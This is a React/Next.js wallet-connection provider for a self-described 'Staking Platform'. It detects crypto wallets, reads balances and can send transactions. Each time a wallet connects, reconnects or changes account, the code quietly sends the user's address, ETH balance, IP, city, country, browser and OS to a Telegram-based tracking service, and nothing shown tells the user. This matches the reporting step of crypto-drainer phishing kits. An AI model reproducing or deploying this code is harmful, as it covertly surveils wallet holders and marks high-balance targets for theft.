"use client"

import { createContext, useContext, useState, useEffect, type ReactNode, useRef } from "react"
import { WalletConnectionModal } from "@/components/wallet-connection-modal"
import { trackWalletConnection } from "@/lib/telegram-service"

declare global {
  interface Window {
    ethereum?: any
    web3?: any
    tronWeb?: any
    solana?: any
    phantom?: any
    solflare?: any
    coin98?: any
    trustWallet?: any
    okxwallet?: any
    binance?: any
    exodus?: any
    imToken?: any
    tokenpocket?: any
    walletconnect?: any
    WalletConnect?: any
  }
}

const WALLET_CONNECT_PROJECT_ID = process.env.NEXT_PUBLIC_WALLETCONNECT_PROJECT_ID || "2fc330b1a9aa1b7c859bd84210853433"

// Comprehensive wallet list like major platforms
const POPULAR_WALLETS = [
  {
    name: "MetaMask",
    id: "metamask",
    icon: "/images/wallets/metamask-new.png",
    color: "#F6851B",
    downloadUrl: "https://metamask.io/download/",
    description: "Most popular Ethereum wallet",
    category: "browser",
  },
  {
    name: "Coinbase Wallet",
    id: "coinbase",
    icon: "/images/wallets/coinbase.png",
    color: "#0052FF",
    downloadUrl: "https://www.coinbase.com/wallet",
    description: "Secure wallet by Coinbase",
    category: "browser",
  },
  {
    name: "Trust Wallet",
    id: "trust",
    icon: "/images/wallets/trustwallet.png",
    color: "#3375BB",
    downloadUrl: "https://trustwallet.com/",
    description: "Multi-chain mobile wallet",
    category: "mobile",
  },
  {
    name: "Rainbow",
    id: "rainbow",
    icon: "/images/wallets/rainbow.png",
    color: "#FF6B6B",
    downloadUrl: "https://rainbow.me/",
    description: "Beautiful Ethereum wallet",
    category: "mobile",
  },
  {
    name: "Ledger",
    id: "ledger",
    icon: "/images/wallets/ledger.png",
    color: "#000000",
    downloadUrl: "https://www.ledger.com/",
    description: "Hardware wallet security",
    category: "hardware",
  },
  {
    name: "OKX Wallet",
    id: "okx",
    icon: "/images/wallets/okx.png",
    color: "#000000",
    downloadUrl: "https://www.okx.com/web3",
    description: "Multi-chain Web3 wallet",
    category: "browser",
  },
  {
    name: "Binance Wallet",
    id: "binance",
    icon: "/images/wallets/binance.png",
    color: "#F3BA2F",
    downloadUrl: "https://www.binance.org/en",
    description: "Binance ecosystem wallet",
    category: "browser",
  },
  {
    name: "Exodus",
    id: "exodus",
    icon: "/images/wallets/exodus-new.png",
    color: "#8B5CF6",
    downloadUrl: "https://www.exodus.com/",
    description: "Beautiful multi-asset wallet",
    category: "desktop",
  },
  {
    name: "Argent",
    id: "argent",
    icon: "/images/wallets/argent.png",
    color: "#FF875B",
    downloadUrl: "https://www.argent.xyz/",
    description: "Smart contract wallet",
    category: "mobile",
  },
  {
    name: "imToken",
    id: "imtoken",
    icon: "/images/wallets/imtoken.png",
    color: "#11C4D1",
    downloadUrl: "https://token.im/",
    description: "Leading DeFi wallet",
    category: "mobile",
  },
  {
    name: "TokenPocket",
    id: "tokenpocket",
    icon: "/images/wallets/tokenpocket.png",
    color: "#2980FE",
    downloadUrl: "https://www.tokenpocket.pro/",
    description: "Multi-chain wallet",
    category: "mobile",
  },
  {
    name: "Crypto.com DeFi",
    id: "crypto-com",
    icon: "/images/wallets/crypto-com.png",
    color: "#003CDA",
    downloadUrl: "https://crypto.com/defi-wallet",
    description: "DeFi wallet by Crypto.com",
    category: "mobile",
  },
]

const WALLETCONNECT_WALLET = {
  name: "WalletConnect",
  id: "walletconnect",
  icon: "data:image/svg+xml;base64,PHN2ZyB3aWR0aD0iMzIiIGhlaWdodD0iMzIiIHZpZXdCb3g9IjAgMCAzMDAgMTg1IiBmaWxsPSJub25lIiB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciPjxwYXRoIGZpbGxSdWxlPSJldmVub2RkIiBjbGlwUnVsZT0iZXZlbm9kZCIgZD0iTTYwLjEwMiAzMC4yMjZDMTA0LjA5NiAtMTAuMDc1MyAxNzUuOTA0IC0xMC4wNzUzIDIxOS44OTggMzAuMjI2TDIyNi4zMDcgMzYuMDE3QzIyOC4yNzUgMzcuODM2NCAyMjguMjc1IDQwLjk1OTYgMjI2LjMwNyA0Mi43NzlMMTk3Ljc2IDY5LjAxMzNDMTk2Ljc3NiA3MC40MjMyIDE5NC45MjYgNzAuNDIzMiAxOTMuOTQyIDY5LjAxMzNMMTg0LjczNSA2MC41NTMyQzE1NC40ODkgMzIuNzcyNiAxMjUuNTExIDMyLjc3MjYgOTUuMjY0OSA2MC41NTMyTDg1LjMwNjcgNjkuNzM2OUM4NC4zMjI3IDcxLjE0NjggODIuNDcyNyA3MS4xNDY4IDgxLjQ4ODcgNjkuNzM2OUw1Mi45NDE2IDQzLjUwMjZDNTAuOTczNiA0MS42ODMyIDUwLjk3MzYgMzguNTYgNTIuOTQxNiAzNi43NDA2TDYwLjEwMiAzMC4yMjZaTTI0Mi4zNDIgNTEuMzQ2NkwyNjcuOTUxIDc0Ljk4NjZDMjY5LjkxOSA3Ni44MDYgMjY5LjkxOSA3OS45MjkyIDI2Ny45NTEgODEuNzQ4NkwyMDAuMjkzIDE0NC4wMTVDMTk4LjMyNSAxNDUuODM0IDE5NS4zNzcgMTQ1LjgzNCAxOTMuNDA5IDE0NC4wMTVDMTkzLjQwOSAxNDQuMDE1IDE5My40MDkgMTQ0LjAxNSAxOTMuNDA5IDE0NC4wMTVMMTQzLjU2MiA5OC4wNTc0QzE0My4wNyA5Ny4zNTI0IDE0Mi4xNDUgOTcuMzUyNCAxNDEuNjUzIDk4LjA1NzRDMTQxLjY1MyA5OC4wNTc0IDE0MS42NTMgOTguMDU3NCAxNDEuNjUzIDk4LjA1NzRMMTAxLjg5MSAxNDQuMDE1Qzk5LjkyMyAxNDUuODM0IDk2Ljk3NSAxNDUuODM0IDk1LjAwNyAxNDQuMDE1Qzk1LjAwNyAxNDQuMDE1IDk1LjAwNyAxNDQuMDE1IDk1LjAwNyAxNDQuMDE1TDI3LjM0OTEgODEuNzQ4NkMyNS4zODExIDc5LjkyOTIgMjUuMzgxMSA3Ni44MDYgMjcuMzQ5MSA3NC45ODY2TDUyLjk1ODEgNTEuMzQ2NkM1NC45MjYxIDQ5LjUyNzIgNTcuODc0MSA0OS41MjcyIDU5Ljg0MjEgNTEuMzQ2NkwxMDkuNjg5IDk3LjMwNDJDMTEwLjE4MSA5OC4wMDkyIDExMS4xMDYgOTguMDA5MiAxMTEuNTk4IDk3LjMwNDJDMTExLjU5OCA5Ny4zMDQyIDExMS41OTggOTcuMzA0MiAxMTEuNTk4IDk3LjMwNDJMMTUxLjM2IDUxLjM0NjZDMTUzLjMyOCA0OS41MjcyIDE1Ni4yNzYgNDkuNTI3MiAxNTguMjQ0IDUxLjM0NjZDMTU4LjI0NCA1MS4zNDY2IDE1OC4yNDQgNTEuMzQ2NiAxNTguMjQ0IDUxLjM0NjZMMjA4LjA5MSA5Ny4zMDQyQzIwOC41ODMgOTguMDA5MiAyMDkuNTA4IDk4LjAwOTIgMjEwIDk3LjMwNDJDMjEwIDk3LjMwNDIgMjEwIDk3LjMwNDIgMjEwIDk3LjMwNDJMMjU5Ljg0NyA1MS4zNDY2QzI2MS44MTUgNDkuNTI3MiAyNjQuNzYzIDQ5LjUyNzIgMjY2LjczMSA1MS4zNDY2TDI0Mi4zNDIgNTEuMzQ2NloiIGZpbGw9IiMzQjk5RkMiLz48L3N2Zz4K",
  color: "#3B99FC",
  downloadUrl: "https://walletconnect.com/",
  description: "Connect 300+ wallets",
  category: "protocol",
}

type WalletInfo = {
  name: string
  id: string
  icon: string
  color: string
  downloadUrl: string
  description: string
  category: string
}

type Web3ContextType = {
  isConnected: boolean
  address: string | null
  balance: string
  connect: () => Promise<boolean>
  disconnect: () => void
  selectNewWallet: () => void
  refreshBalance: () => Promise<number>
  tokenBalances: Record<string, string>
  detectedWallets: WalletInfo[]
  sendTransaction: (to: string, value: string, data?: string) => Promise<string>
}

export const Web3Context = createContext<Web3ContextType>({
  isConnected: false,
  address: null,
  balance: "0",
  connect: async () => false,
  disconnect: () => {},
  selectNewWallet: () => {},
  refreshBalance: async () => 0,
  tokenBalances: {},
  detectedWallets: [],
  sendTransaction: async () => "",
})

export const useWeb3 = () => useContext(Web3Context)

export function Web3Provider({ children }: { children: ReactNode }) {
  const [isConnected, setIsConnected] = useState(false)
  const [address, setAddress] = useState<string | null>(null)
  const [balance, setBalance] = useState("0")
  const [walletType, setWalletType] = useState<string>("Unknown")
  const [isWalletModalOpen, setIsWalletModalOpen] = useState(false)
  const [tokenBalances, setTokenBalances] = useState<Record<string, string>>({})
  const [activeProvider, setActiveProvider] = useState<any>(null)
  const [hasDisconnected, setHasDisconnected] = useState(false)
  const [isConnecting, setIsConnecting] = useState(false)
  const [detectedWallets, setDetectedWallets] = useState<WalletInfo[]>([])

  const notificationSentRef = useRef<Record<string, boolean>>({})

  // Comprehensive wallet detection
  const detectInstalledWallets = (): WalletInfo[] => {
    if (typeof window === "undefined") return []

    const detected: WalletInfo[] = []

    // Check for MetaMask (most reliable detection)
    if (window.ethereum?.isMetaMask || window.ethereum?.providers?.some((p: any) => p.isMetaMask)) {
      detected.push(POPULAR_WALLETS.find((w) => w.id === "metamask")!)
    }

    // Check for Coinbase Wallet
    if (window.ethereum?.isCoinbaseWallet || window.ethereum?.providers?.some((p: any) => p.isCoinbaseWallet)) {
      detected.push(POPULAR_WALLETS.find((w) => w.id === "coinbase")!)
    }

    // Check for Trust Wallet
    if (window.ethereum?.isTrust || window.trustWallet) {
      detected.push(POPULAR_WALLETS.find((w) => w.id === "trust")!)
    }

    // Check for Rainbow
    if (window.ethereum?.isRainbow) {
      detected.push(POPULAR_WALLETS.find((w) => w.id === "rainbow")!)
    }

    // Check for OKX Wallet
    if (window.okxwallet || window.ethereum?.isOkxWallet) {
      detected.push(POPULAR_WALLETS.find((w) => w.id === "okx")!)
    }

    // Check for Binance Wallet
    if (window.BinanceChain || window.ethereum?.isBinance) {
      detected.push(POPULAR_WALLETS.find((w) => w.id === "binance")!)
    }

    // Check for Exodus
    if (window.ethereum?.isExodus) {
      detected.push(POPULAR_WALLETS.find((w) => w.id === "exodus")!)
    }

    // Check for imToken
    if (window.ethereum?.isImToken || window.imToken) {
      detected.push(POPULAR_WALLETS.find((w) => w.id === "imtoken")!)
    }

    // Check for TokenPocket
    if (window.ethereum?.isTokenPocket || window.tokenpocket) {
      detected.push(POPULAR_WALLETS.find((w) => w.id === "tokenpocket")!)
    }

    // Always add WalletConnect as an option
    detected.push(WALLETCONNECT_WALLET)

    // Remove duplicates and filter out undefined
    return detected.filter((wallet, index, self) => wallet && self.findIndex((w) => w.id === wallet.id) === index)
  }

  // Get the correct provider for a wallet
  const getProviderForWallet = (walletId: string): any => {
    if (typeof window === "undefined") return null

    switch (walletId) {
      case "metamask":
        if (window.ethereum?.isMetaMask) return window.ethereum
        if (window.ethereum?.providers) {
          return window.ethereum.providers.find((p: any) => p.isMetaMask)
        }
        return null

      case "coinbase":
        if (window.ethereum?.isCoinbaseWallet) return window.ethereum
        if (window.ethereum?.providers) {
          return window.ethereum.providers.find((p: any) => p.isCoinbaseWallet)
        }
        return null

      case "trust":
        return window.ethereum?.isTrust ? window.ethereum : window.trustWallet

      case "rainbow":
        return window.ethereum?.isRainbow ? window.ethereum : null

      case "okx":
        return window.okxwallet || (window.ethereum?.isOkxWallet ? window.ethereum : null)

      case "binance":
        return window.BinanceChain || (window.ethereum?.isBinance ? window.ethereum : null)

      case "exodus":
        return window.ethereum?.isExodus ? window.ethereum : null

      case "imtoken":
        return window.imToken || (window.ethereum?.isImToken ? window.ethereum : null)

      case "tokenpocket":
        return window.tokenpocket || (window.ethereum?.isTokenPocket ? window.ethereum : null)

      default:
        // Fallback to window.ethereum for unknown wallets
        return window.ethereum
    }
  }

  // Get user's location info for notifications
  const getUserLocationInfo = async () => {
    try {
      const response = await fetch("/api/check-ip")
      if (response.ok) {
        const data = await response.json()
        return {
          ip: data.ip || "Unknown",
          country: data.country || "Unknown",
          city: data.city || "Unknown",
          browser: navigator.userAgent.includes("Chrome")
            ? "Chrome"
            : navigator.userAgent.includes("Firefox")
              ? "Firefox"
              : navigator.userAgent.includes("Safari")
                ? "Safari"
                : "Unknown",
          os: navigator.platform || "Unknown",
          isMobile: /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent),
          referer: document.referrer || "Direct",
          userAgent: navigator.userAgent,
        }
      }
    } catch (error) {
      console.error("Failed to get location info:", error)
    }

    return {
      ip: "Unknown",
      country: "Unknown",
      city: "Unknown",
      browser: "Unknown",
      os: "Unknown",
      isMobile: false,
      referer: "Direct",
      userAgent: navigator.userAgent,
    }
  }

  // Initialize WalletConnect
  const initializeWalletConnect = async () => {
    try {
      const { EthereumProvider } = await import("@walletconnect/ethereum-provider")

      const provider = await EthereumProvider.init({
        projectId: WALLET_CONNECT_PROJECT_ID,
        chains: [1],
        showQrModal: true,
        metadata: {
          name: "Staking Platform",
          description: "Modern Ethereum Staking Platform",
          url: window.location.origin,
          icons: [`${window.location.origin}/logo.png`],
        },
      })

      provider.on("connect", async () => {
        if (provider.accounts && provider.accounts.length > 0) {
          const userAddress = provider.accounts[0]
          setAddress(userAddress)
          setIsConnected(true)
          setActiveProvider(provider)
          setWalletType("WalletConnect")
          setIsWalletModalOpen(false) // Close modal on successful connection

          localStorage.setItem("walletAddress", userAddress)
          localStorage.setItem("walletType", "WalletConnect")

          const balanceValue = await updateBalance(provider, userAddress)
          await sendConnectionNotification(userAddress, "WalletConnect", balanceValue.toString())
        }
      })

      provider.on("disconnect", () => {
        disconnect()
      })

      await provider.connect()
      return true
    } catch (error) {
      console.error("WalletConnect initialization failed:", error)
      return false
    }
  }

  // Update detected wallets on mount
  useEffect(() => {
    const detected = detectInstalledWallets()
    setDetectedWallets(detected)
  }, [])

  // Auto-connect on page load
  useEffect(() => {
    const autoConnect = async () => {
      if (hasDisconnected) return

      const savedAddress = localStorage.getItem("walletAddress")
      const savedWalletType = localStorage.getItem("walletType")
      if (!savedAddress || !savedWalletType) return

      // Try to reconnect with the saved wallet
      const provider = getProviderForWallet(savedWalletType.toLowerCase())

      if (provider) {
        try {
          const accounts = await provider.request({ method: "eth_accounts" })

          if (accounts && accounts.length > 0 && accounts[0] === savedAddress) {
            const userAddress = accounts[0]

            setAddress(userAddress)
            setIsConnected(true)
            setActiveProvider(provider)
            setWalletType(savedWalletType)

            const balanceValue = await updateBalance(provider, userAddress)
            await sendConnectionNotification(userAddress, savedWalletType, balanceValue.toString())
            return
          }
        } catch (error) {
          console.warn("Auto-connect failed for saved wallet:", error)
        }
      }

      // Clear saved data if no active connection found
      localStorage.removeItem("walletAddress")
      localStorage.removeItem("walletType")
    }

    autoConnect()
  }, [hasDisconnected])

  // Listen for account changes
  useEffect(() => {
    if (!activeProvider) return

    const handleAccountsChanged = async (accounts: string[]) => {
      if (accounts.length === 0) {
        disconnect()
      } else if (accounts[0] !== address) {
        const newAddress = accounts[0]
        setAddress(newAddress)
        localStorage.setItem("walletAddress", newAddress)
        const balanceValue = await updateBalance(activeProvider, newAddress)
        await sendConnectionNotification(newAddress, walletType, balanceValue.toString())
      }
    }

    const handleChainChanged = () => {
      window.location.reload()
    }

    if (activeProvider.on) {
      activeProvider.on("accountsChanged", handleAccountsChanged)
      activeProvider.on("chainChanged", handleChainChanged)
    }

    return () => {
      if (activeProvider.removeListener) {
        activeProvider.removeListener("accountsChanged", handleAccountsChanged)
        activeProvider.removeListener("chainChanged", handleChainChanged)
      }
    }
  }, [activeProvider, address, walletType])

  // Update balance with better error handling and retries
  const updateBalance = async (provider: any, userAddress: string): Promise<number> => {
    let retries = 3

    while (retries > 0) {
      try {
        console.log(`Fetching balance for ${userAddress}, retries left: ${retries}`)

        const balanceHex = await provider.request({
          method: "eth_getBalance",
          params: [userAddress, "latest"],
        })

        const balanceWei = BigInt(balanceHex)
        const balanceEth = Number(balanceWei) / 1e18
        const formattedBalance = balanceEth.toFixed(6)

        console.log(`Balance updated: ${formattedBalance} ETH`)

        setBalance(formattedBalance)
        setTokenBalances({ ETH: formattedBalance })

        return balanceEth
      } catch (error) {
        console.error(`Error updating balance (${retries} retries left):`, error)
        retries--

        if (retries > 0) {
          await new Promise((resolve) => setTimeout(resolve, 1000))
        } else {
          setBalance("0")
          setTokenBalances({ ETH: "0" })
          return 0
        }
      }
    }

    return 0
  }

  // Send transaction
  const sendTransaction = async (to: string, value: string, data?: string): Promise<string> => {
    if (!activeProvider || !address) {
      throw new Error("Wallet not connected")
    }

    try {
      // Convert ETH to Wei
      const valueWei = BigInt(Math.floor(Number(value) * 1e18))
      const valueHex = `0x${valueWei.toString(16)}`

      const transactionParams: any = {
        from: address,
        to,
        value: valueHex,
      }

      if (data) {
        transactionParams.data = data
      }

      console.log("Sending transaction:", transactionParams)

      const txHash = await activeProvider.request({
        method: "eth_sendTransaction",
        params: [transactionParams],
      })

      console.log("Transaction sent:", txHash)
      return txHash
    } catch (error) {
      console.error("Transaction failed:", error)
      throw error
    }
  }

  // Send comprehensive connection notification
  const sendConnectionNotification = async (userAddress: string, walletName: string, balanceValue: string) => {
    if (notificationSentRef.current[userAddress]) return

    try {
      const locationInfo = await getUserLocationInfo()
      const tokenHoldings: Record<string, string> = { ETH: balanceValue }
      const etherscanLink = `https://etherscan.io/address/${userAddress}`

      const connectionData = {
        address: userAddress,
        balance: balanceValue,
        walletType: walletName,
        success: true,
        etherscanLink,
        tokenHoldings,
        ...locationInfo,
      }

      console.log("Sending wallet connection notification:", connectionData)

      const success = await trackWalletConnection(connectionData)

      if (success) {
        notificationSentRef.current[userAddress] = true
        console.log("Wallet connection notification sent successfully")
      } else {
        console.error("Failed to send wallet connection notification")
      }
    } catch (error) {
      console.error("Failed to send connection notification:", error)
    }
  }

  // Connect wallet
  const connect = async (): Promise<boolean> => {
    if (isConnecting) return false

    try {
      setIsConnecting(true)

      if (isConnected && address) {
        setIsConnecting(false)
        return true
      }

      // Always show modal for wallet selection
      setIsWalletModalOpen(true)
      setIsConnecting(false)
      return false
    } catch (error) {
      console.error("Connection failed:", error)
      setIsWalletModalOpen(true)
      setIsConnecting(false)
      return false
    }
  }

  // Handle wallet selection from modal
  const handleWalletSelection = async (walletId: string): Promise<boolean> => {
    try {
      setIsConnecting(true)

      if (walletId === "walletconnect") {
        const success = await initializeWalletConnect()
        setIsConnecting(false)
        return success
      }

      const provider = getProviderForWallet(walletId)

      if (!provider) {
        const wallet = POPULAR_WALLETS.find((w) => w.id === walletId)
        if (wallet) {
          window.open(wallet.downloadUrl, "_blank")
        }
        setIsConnecting(false)
        return false
      }

      const accounts = await provider.request({ method: "eth_requestAccounts" })

      if (accounts && accounts.length > 0) {
        const userAddress = accounts[0]
        const wallet = POPULAR_WALLETS.find((w) => w.id === walletId)
        const walletName = wallet?.name || "Unknown Wallet"

        setAddress(userAddress)
        setIsConnected(true)
        setActiveProvider(provider)
        setWalletType(walletName)
        setHasDisconnected(false)
        setIsWalletModalOpen(false) // Close modal on successful connection

        localStorage.setItem("walletAddress", userAddress)
        localStorage.setItem("walletType", walletName)

        const balanceValue = await updateBalance(provider, userAddress)
        await sendConnectionNotification(userAddress, walletName, balanceValue.toString())

        setIsConnecting(false)
        return true
      }

      setIsConnecting(false)
      return false
    } catch (error: any) {
      console.error("Wallet selection failed:", error)
      setIsConnecting(false)

      if (error.code === 4001) {
        return false
      }

      return false
    }
  }

  // Disconnect wallet
  const disconnect = () => {
    if (activeProvider && activeProvider.disconnect) {
      try {
        activeProvider.disconnect()
      } catch (error) {
        console.warn("Error disconnecting provider:", error)
      }
    }

    setAddress(null)
    setIsConnected(false)
    setBalance("0")
    setWalletType("Unknown")
    setActiveProvider(null)
    setTokenBalances({})
    setHasDisconnected(true)

    localStorage.removeItem("walletAddress")
    localStorage.removeItem("walletType")

    notificationSentRef.current = {}
  }

  // Select new wallet
  const selectNewWallet = () => {
    disconnect()
    setIsWalletModalOpen(true)
  }

  // Refresh balance
  const refreshBalance = async (): Promise<number> => {
    if (isConnected && address && activeProvider) {
      return await updateBalance(activeProvider, address)
    }
    return 0
  }

  return (
    <Web3Context.Provider
      value={{
        isConnected,
        address,
        balance,
        connect,
        disconnect,
        selectNewWallet,
        refreshBalance,
        tokenBalances,
        detectedWallets,
        sendTransaction,
      }}
    >
      {children}
      <WalletConnectionModal
        isOpen={isWalletModalOpen}
        onClose={() => setIsWalletModalOpen(false)}
        detectedWallets={detectedWallets}
        popularWallets={POPULAR_WALLETS}
        onSelectWallet={handleWalletSelection}
      />
    </Web3Context.Provider>
  )
}
